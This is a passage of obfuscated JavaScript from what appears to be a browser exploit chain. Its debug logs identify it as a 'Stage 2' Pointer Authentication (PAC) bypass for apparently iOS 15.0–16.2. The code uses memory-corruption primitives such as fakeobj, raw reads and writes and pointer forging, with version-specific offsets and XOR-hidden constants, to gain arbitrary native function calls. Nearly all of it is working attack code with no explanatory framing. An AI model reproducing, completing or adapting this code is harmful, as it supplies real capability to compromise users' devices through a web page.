            f = (c => {
                if (!0 === globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.QwxZcT) {
                    const o = BigInt(s.read32(c)) & BigInt(4294967294);
                    return x.K(o * BigInt(16))
                }
                if (!0 === globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.juV600) {
                    if (null === this.Za) throw new Error("");
                    const o = s.read32(c) >> 5 & 67108863,
                        i = 0 == (8 & c) ? s.readRawBigInt(c - c % 16384 + 16088) : s.readRawBigInt(c - 16),
                        t = s.readRawBigInt(i + globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.MhLcu0);
                    return s.readDoubleAsPointer(t + 8 * o)
                }
                if (!0 === globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.ptTH_q) {
                    if (null === this.Za) throw new Error("");
                    const o = s.read32(c) & globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.RNiPoX;
                    return P.platformState.exploitPrimitive.readRawBigInt(this.Za + globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.kEXt5Z) + o
                } {
                    const o = s.read32(c) >> globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.rD3mNF & (1698986103 ^ 1706788744),
                        i = 0 == (8 & c) ? s.readRawBigInt(c - c % 16384 + 16088) : s.readRawBigInt(c - 16),
                        t = s.readRawBigInt(i + globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.MhLcu0);
                    return s.readDoubleAsPointer(t + 8 * o)
                }
            })(z),
            H = n(256);
        window.log("[Stage 2] versionFlags passed ok");
        for (let c = 24; c < 112; c += 8) s.writeInt64ToOffset(H + c, y);
        s.writeInt64ToOffset(H + 96, h.yc);
        const Q = n(24);
        s.copyBigInt(Q + 8, H);
        const V = n(24),
            W = n(56),
            R = n(56);
        s.writeInt64ToOffset(R + 40, m.yc), s.copyBigInt(R + 32, V), s.copyBigInt(R + 48, W);
        const O = x.Vt.ut(Q),
            Y = x.Vt.ut(R);
        !0 === globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.QwxZcT && (M = x.K(x.O(M) / BigInt(16)));
        window.log("[Stage 2] versionFlags.QwxZcT &&");

        const U = function(i, t, a) {
                s.writeInt64ToOffset(W + 40, i), s.writeInt64ToOffset(W + 32, t), s.writeInt64ToOffset(W + 48, a);
                const l = s.read32(f + o);
                let b = 0;
                try {
                    s.write32(f + o, 1 | l), s.withTempOverrides((() => {
                        new Function("a", "b", "var ct" + (b) + " = a instanceof b ? " + (b + 1) + " : 12; return ct" + (b) + ";")(N, A)
                    }), {
                        Ir: f + c,
                        Zt: x.Vt.ut(M)
                    }, {
                        Ir: z + 16,
                        Zt: O
                    }, {
                        Ir: z + 32,
                        Zt: X.yc
                    }, {
                        Ir: z + 8,
                        Zt: Y
                    }, {
                        Ir: L,
                        Zt: X.yc
                    }, {
                        Ir: p,
                        Zt: y
                    })
                } finally {
                    s.write32(f + o, l), b += 1
                }
                return s.readInt64FromOffset(V + 16)
            },
            E = n(80),
            J = n(56),
            v = x.Vt.ut(E);
        window.log("[Stage 2] weird expressions passed");
        s.copyBigInt(E + 72, J);
        const F = function(c, o, i, t) {
                return s.writeInt64ToOffset(J + 8, o), s.writeInt64ToOffset(J + 16, c), s.writeInt64ToOffset(J + 48, t), U(K.yc, v, i)
            },
            j = U(g, new x.Vt((4294967296 + (2051826740 ^ -2051826742)), (4294967296 + (808676710 ^ -808676711))), x.Vt.ut(function(c) {
                const o = new Uint8Array(c.length + 1);
                for (let i = 0; i < c.length; i++) o[i] = c.charCodeAt(i);
                const i = s.fakeobj(o);
                return u[i] = o, i
            }(([21, 8, 10, 23, 12, 29, 27, 12].map(x => {
                return String.fromCharCode(x ^ 120);
            }).join(""))))),
            B = G + i,
            _ = B - B % (2037926227 ^ 2037909843);
        if (0 !== F(j, x.Vt.ut(_), x.Vt.ut((826882385 ^ 826898769)), x.Vt.ut(3)).Pt()) throw new Error("");
        const q = (() => {
            const c = this.Mc(),
                o = P.platformState.exploitPrimitive.fakeobj(c),
                l = x.Vt.ut(o),
                b = new Uint8Array(c.buffer),
                I = 304,
                d = 127;
            c[34] = 0, c[35] = 0, c[36] = 0, c[37] = 1;
            let y = 307;
            for (let c = 0; c < "a".length; c++) b[y++] = "a".charCodeAt(c);
            b[y++] = 0, b[y++] = d, b[431] = 3, b[432] = 0;
            const r = n(512);
            s.write32(r, 1936733284), s.write32(r + 8, 512);
            const C = r + 16;
            s.write32(C, 1815378276), s.copyBigInt(C + 8, o), s.write32(C + t, I), s.write32(C + a, 2048);
            const e = x.Vt.ut(r),
                u = x.Vt.ut(o + I + 3);
            let h = x.Vt.ut(2 * C);
            if (!0 === globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.QwxZcT) {
                const c = x.Vt.ut(k.ar().wh);
                h = x.Vt.ut(C).vt(c)
            }
            return function(c) {
                const o = x.Vt.ut(c).sub(l);
                window.log("[Stage 2] before call to Xt");
                window.log(`[Stage 2] o: ${o} c: ${c}`);
                x.Xt(b, 433, o);
                window.log("[Stage 2] after call to Xt");
                let t = null;
                if (s.withTempOverrides((() => {
                        t = U(g, h, u)
                    }), {
                        Ir: G + i,
                        Zt: e
                    }), t.Dt().yt() !== c) throw new Error("");
                return t
            }
        })();
        window.log("[Stage 2] before crash");
        this.La = q(D), this.Ga = q(w), this.Xa = q(Z), this.Ma = q(S);
        window.log("[Stage 2] after crash");

        const $ = n(24);
        window.log("[Stage 2] near ...s.withTempOverrides...");

        this.tc = U, this.ic = F, this.Ka = function(c, o, i) {
            return s.writeInt64ToOffset($ + 16, c), s.writeInt64ToOffset($ + 0, o), U(T.yc, i, x.Vt.ut($))
        }
        window.log("[Stage 2] PAC bypass - Stage2_15.0_16.2_breezy15 finished!");
        window.log("[Stage 2] PAC bypass OK!");
    }
}
return r.ga = function() {

    return new oc
}, r;